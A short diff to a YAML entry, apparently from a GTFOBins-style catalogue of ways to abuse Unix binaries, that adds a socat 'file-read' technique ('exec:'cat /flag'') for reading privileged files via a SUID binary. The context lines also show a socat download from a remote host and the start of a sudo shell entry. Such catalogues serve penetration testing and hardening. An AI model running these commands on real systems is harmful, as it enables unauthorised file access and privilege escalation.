@@ -29,6 +29,10 @@ functions:
         RPORT=12345
         LFILE=file_to_save
         socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
+  file-read:
+    - description: Read local files from the system. If the SUID bit is set this can be used to read privileged local files.
+      code: |
+        socat stdin exec:'cat /flag'
   sudo:
     - description: The resulting shell is not a proper TTY shell and lacks the prompt.
       code: |
